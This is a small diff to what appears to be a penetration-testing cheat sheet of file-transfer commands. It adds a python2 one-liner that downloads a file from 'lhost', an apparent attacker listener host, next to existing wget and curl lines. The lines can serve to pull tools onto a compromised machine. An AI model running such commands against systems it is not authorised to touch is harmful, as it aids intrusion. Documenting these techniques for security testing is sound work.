@@ -4,6 +4,7 @@
 wget http://$address:$port/$download_path
 wget $address:$port/$download_path
 curl "http://$address:$port/$download_path" --output $file_name
+python2 -c "import urllib; urllib.urlretrieve('http://lhost/some_file', 'somefile');"
 ```
 
 ```cmd
